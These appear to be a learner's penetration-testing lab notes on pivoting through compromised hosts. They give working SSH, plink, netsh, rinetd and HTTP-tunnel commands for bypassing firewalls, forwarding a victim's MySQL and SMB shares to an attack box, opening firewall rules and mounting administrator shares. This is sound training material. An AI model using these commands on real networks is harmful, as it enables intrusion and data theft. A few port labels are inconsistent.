
**Tunneling:** Encapsulating a protocol within a different protocol  
Can carry a given protocol over an incompatible delivery network OR  
Provides a secure path through an untrusted network.  
  
  
**Port Forwarding:** Traffic manipulation where we redirect traffic destined for 1 IP & port to another  
  
  
Scenario:  
	Gain root acces to an Internet-connected Linux web server & pivot to a Linux client on an internal network, gaining access to SSH creds.  
	Before pivoting from the Linux client to other internal machines, must be able to transfer attack tools & exfill data as needed.  
	As internal Linux client can't access the internet, we have to use the compromised Linux web server as a go-between - transferring data twice.  


Port Forwarding makes this easier:  
![[rinetd.png]]

  
  
### RINETD:

Port forwarding tool that'll redirect traffic. Helps w/ data transfer  
  
add bindaddress, bindport (<- listeners), connectaddress, connectport (<-destination) to _/etc/rinetd.conf_ on web-accessible or attack machine  
```bash
vim /etc/rinetd.conf
...
	0.0.0.0 80 8.8.8.8 80
...
```

  
connect to web-accessible or attack machine from victim/ no-web machine.  
```bash
nc -nvv 192.168.119.126 80  
	(UNKNOWN) [192.168.119.126] 80 (http) open  
	GET / HTTP/1.0  
  
	HTTP/1.0 200 OK  
	Date: Fri, 27 Jan 2023 18:48:07 GMT  
	...  
	Set-Cookie: ... domain=.google.com; Secure
	```



### SSH Tunneling:
![[tunneling.png]]

Most popular for tunneling and port forwarding.  
	- Ability to create encrypted tunnels  
	- Supports bi-directional comm channels  
  
  
##### LOCAL:  
  
Scenario:  
	During a test, we've compromised a Linux-based target through a remote vuln. Elevated to root, & got the pws for all users.  
	Compromised machine doesn't appear to have any outbound traffic filtering. Only exposes SSH, RDP, & vuln service port. -- Also allowed on the firewall.  
	After enum, discover an additional nic connected to a different network. In this internal subnet, there's a WinServer 2016 that has network shares available.  
  
Ex:  
```bash
# SSH Scenario  
iptables -F  
iptables -P INPUT DROP  
iptables -P FORWARD DROP  
iptables -A INPUT -i lo -j ACCEPT  
iptables -A INPUT -m state --state ESTABLISHED,RELATED -j ACCEPT  
iptables -A INPUT -p tcp --dport 3389 -m state --state NEW -j ACCEPT  
iptables -A INPUT -p tcp --dport 22 -m state --state NEW -j ACCEPT  
iptables -A INPUT -p tcp --dport 8080 -m state --state NEW -j ACCEPT  
iptables -A INPUT -i lo -j ACCEPT
```


Rather than moving needed tools to the machine then attempt to interact w/ the shares on the server,  
we'll want to interact with this new target from our attack machine, pivoting thorugh this compromised Linux client. 

Gives us all the tool access we need:  
```bash
ssh -N -L [bind_address:]port:host:hostport [username@address]
```
	**-N** - Do not execute a remote command (useful when just forwarding ports)  
	**-L** - Specifies local host port that'll be forwarded to a remote address & port  
  
  
Given our scenario: Forward port 445 (NetBIOS) on attack to port 445 on Server2016  
	Allows any file sharing queries directed at our attack maching will be forwarded to the Server target.  
	Even though port 445 is blocked by the FW, it's tunneled through an SSH session on 22 (which is allowed)
  
![[ssh-tunnel.png]]
  
As Server2016 no longer supports SMBv1, change samba config to set minimum version to SMBv2:  
```bash
sudo vim /etc/samba/smb.conf  
	...  
	min protocol = SMB2  
	[EOF]  
  
sudo /etc/init.d/smbd restart
```

Tunnel:  
```bash
sudo ssh -N -L 0.0.0.0:445:192.168.1.110:445 student@10.11.0.128
```


Now (assuming everything works), use the **[smbclient](Tools.md#smbclient)** utility to access the shares:  
```bash
smbclient -L 127.0.0.1 -U Administrator  
	Unable to initialize messaging context  
	Enter WORKGROUP\Administrators password:   
  
	Sharename       Type      Comment  
	---------       ----      -------  
	ADMIN$          Disk      Remote Admin  
	C$              Disk      Default share  
	Data            Disk        
	IPC$            IPC       Remote IPC  
	NETLOGON        Disk      Logon server share   
	SYSVOL          Disk      Logon server share   
	Reconnecting with SMB1 for workgroup listing.  
  
	Server               Comment  
	---------            -------  
  
	Workgroup            Master  
	---------            -------
```


##### REMOTE:  
  
Port is opened on the remote side of the connection & traffic sent to that port is forwarded to our local machine (machine initiating the SSH client)  
  
Scenario:  
	Access to a non-root shell on a Linux client on internal network. On this compromised machine, we discover MySQL server running on 3306  
	Firewall's blocking inbound SSH connections but allows outbound SSH  
	We _can_ SSH out from this server to our attack machine.  
  
Use **-R** to signify remote forwarding:  
Ex:  (student@debian)
```bash
ssh -N -R 10.11.0.4:2221:127.0.0.1:3306 kali@10.11.0.4
```
	10.11.0.4:2221 - Attack box (kali)  
	127.0.0.1:3306 - Victim's localhost  
  
Results:  (kali) 
```bash
ss -antp | grep "2221"  
	LISTEN   0   128    127.0.0.1:2221     0.0.0.0:*      users:(("sshd",pid=2294,fd=9))  
	LISTEN   0   128      [::1]:2221         [::]:*       users:(("sshd",pid=2294,fd=8))  
      
sudo nmap -sS -sV 127.0.0.1 -p 2221  
  
	Nmap scan report for localhost (127.0.0.1)  
	Host is up (0.000039s latency).  
  
	PORT     STATE SERVICE VERSION  
	2221/tcp open  mysql   MySQL 5.5.5-10.1.26-MariaDB-0+deb9u1  
  
	Nmap done: 1 IP address (1 host up) scanned in 0.56 seconds 
```
  
 
##### DYNAMIC:  
  
Similar scenario to local:  
	Compromised an internal Linux client, elevated privs, no in/out-bound FW blocking, but - this has 2 nic's & is connected to 2 separate networks (10.11.*.* & 192.168.*.*)  
	Rather than targetting one IP & port, we want to target multiple ports.  
  
Use **-D** to signify dynamic forwarding & create a SOCKS4 proxy:  
Ex:  
```bash
sudo ssh -N -D 127.0.0.1:9050 student@10.11.0.128
```
	127.0.0.1:8080 - Attack box (kali)  
	student@10.11.0.128 - Pivot box  
  
  
We still must direct our reconnaissance and attack tools to use this proxy.  
  
[proxychains](proxychains.md)  
  
Add SOCKS4 proxy to _/etc/proxychains4.conf_, and run all desired commands through it:  
```bash
vim /etc/proxychains4.conf  
	...  
	[ProxyList]  
	# add proxy here ...  
	# meanwile  
	# defaults set to "tor"  
	socks4  127.0.0.1 9050  
  
sudo proxychains nmap --top-ports=20 -sT -Pn 192.168.1.110  
	Starting Nmap 7.60 ( https://nmap.org ) at 2019-04-19 18:18 EEST  
	|S-chain|-<>-127.0.0.1:9050-<><>-192.168.1.110:443-<--timeout  
	...  
	|S-chain|-<>-127.0.0.1:9050-<><>-192.168.1.110:445-<><>-OK  
	...
```


  
### Plink.exe

Tunneling on Windows.  
  
Scenario:  
	We've gained access to a Windows10 machine during our assessment through a vuln in Sync Breeze & have obtained a SYSTEM-level reverse shell.  
	During enum (**netstat -anpb TCP**) we discover MySQL running on 3306.  
	Transfer [plink.exe](plink.exe.md) to the target  
  
Ex:  
```bash
cmd.exe /c echo y | plink.exe -ssh -l kali -pw ilak -R 10.11.0.4:1234:127.0.0.1:3306 10.11.0.4
```
.
	**-ssh** - Connect via SSH  
	**-l** - As kali user  
	**-pw** - With password ‘ilak’  
	**-R** - Create a remote port forward of 10.11.0.4's port 1234 to the MySQL port (3306) on the Window's target (127.0.0.1)  
  
  
**cmd.exe /c echo y** - As first time plink connects to a host, it'll attempt to cache the host key in the registry.  
	Likely we won't have the necessary interactivity w/in our remote shell, hence this addition.  
  
  
With **plink** set up through our remote shell on the Win box, we can attack via our target:  
```bash
sudo nmap -sS -sV 127.0.0.1 -p 1234  
	...  
	PORT     STATE SERVICE VERSION  
	1234/tcp open  mysql   MySQL 5.5.5-10.1.31-MariaDB
```
****NOTE: Make sure ssh.service is started on kali first. & make sure MySQL is started on Win first.  
  
  
  
### NETSH

Scenario:  
	Compromised Win10 (10.11.0.22) & privesc, 2 nic's & a Win Server2016 (192.168.1.110) w/ port 445 open.  
	Since we're SYSTEM on Win10, we don't deal w/ UAC.  
  
****NOTE: For this to work, the Windows system must have the _**IPHelper**_ service running and _**IPv6**_ support must be enabled for the interface we want to use.  

```powershell
netsh interface portproxy add v4tov4 listenport=4455 listenaddress=10.11.0.22 connectport=445 connectaddress=192.168.1.110  
  
netstat -anp TCP | find "4455"                                                
	TCP    10.11.0.22:4455        0.0.0.0:0              LISTENING  
```
.  
	**v4tov4** - IPv4-to-IPv4  
	**portproxy** - Proxy  
	**listenaddress=10.11.0.22** - Listener IP (Win10)  
	**listenport**=**4455** - Listener port (Win10)  
	**connectaddress=192.168.1.110** - Connector IP (Server2016)  
	**connectport=445** - Connector port (Server2016)  
  
  
By default, the FW will block use of our tunnel (disallows inbound traffic on 4455).  
Since we're SYSTEM, we'll change FW rules:  
```powershell
netsh advfirewall firewall add rule name="forward_port_rule" protocol=TCP dir=in localip=10.11.0.22 localport=4455 action=allow  
	Ok.
```

  
Try to connect through SAMBA:  
```bash
smbclient -L 10.11.0.22 --port=4455 --user=Administrator  
Password for [WORKGROUP\Administrator]:  
  
        Sharename       Type      Comment  
        ---------       ----      -------  
        ADMIN$          Disk      Remote Admin  
        C$              Disk      Default share  
        Data            Disk        
        IPC$            IPC       Remote IPC  
        NETLOGON        Disk      Logon server share   
        SYSVOL          Disk      Logon server share   
Reconnecting with SMB1 for workgroup listing.  
do_connect: Connection to 192.168.126.10 failed (Error NT_STATUS_IO_TIMEOUT)  
Unable to connect with SMB1 -- no workgroup available  
```
	***NOTE (Not error shown): If this doesn't work, ensure _/etc/samba/smb.conf_ has “min protocol SMB2” in it.  
  
  
Timeout error usually due to a port forwarding error.  
  
**BUT**, we can still mount & interact w/ the share:  
```bash
sudo mkdir /mnt/win10_share  
  
sudo mount -v -t cifs -o unc=\\\\10.11.0.22\\Data,port=4455,vers=3,username=Administrator,password=lab /mnt/Win10share  
  
ls -l /mnt/win10_share/  
	total 1  
	-rwxr-xr-x 1 root root 7 Apr 17  2019 data.txt  
  
cat /mnt/win10_share/data.txt  
	data 
```

****NOTE: If there's an _/etc/fstab_ error, you'll need to add the mount point to the _/etc/fstab_ file  
```bash
//192.168.126.10/Data /mnt/Win10share cifs defaults,vers=3 0 0
```


 
### HTTP Tunneling:

Scenario:  
	Compromised Linux server, elevated privs to root, & gained access to all pwds.  
	Discovered a WinServer 2016 web server on internal network.  
	(for this example, assume a deep packet content inspection feature has been implemented that'll only allow HTTP protocol)  
	SSH-based tunnels won't work btw the server & attack box (will work fine on internal networked machines)  
	Firewall btw Linux server & Kali only allows 80, 443, 1234 in/out.  
	80 & 443 - web server; 1234 - oversight & not mapped to any listening port in the internal network.  
  
  
Goal: Initiate a remote desktop connection from our attack machine to the Win Server2016 through the compromised Linux server only using HTTP.  
  
We'll put **hts** on compromised Linux server (s.t.u.v) & **htc** on attack box (a.b.c.d) & and SSH tunnel btw Linux server (s.t.u.v) and Server2016 (w.x.y.z)   
  
![[httptunnel.png]]
  

Add an SSH port forward from our compromised Linux server (s.t.u.v) on the internal network to the Server2016 (w.x.y.z) (student@debian):
```bash
ssh -L 0.0.0.0:8888:<Server2016_IP>:3389 student@127.0.0.1
```
  
Create an HTTP-based tunnel btw machines:  
	Input will be on our attack maching (kali) @ 8080  
```bash
htc --forward-port 8080 <LinuxServer_IP>:1234
```

  Output will be on compromised Linux box (student@debian) on 1234 (across the FW):
```bash
hts --forward-port localhost:8888 1234
```

HTTP requests will be decapsulated & handed off to the listening port (Linux server 8888) (run on kali):
```bash
rdesktop 127.0.0.1:8080
```


(*NOTE: Got Server2016 to rdesktop, but there was no interacting w/ it. *could be my comp? it seemed pretty laggy)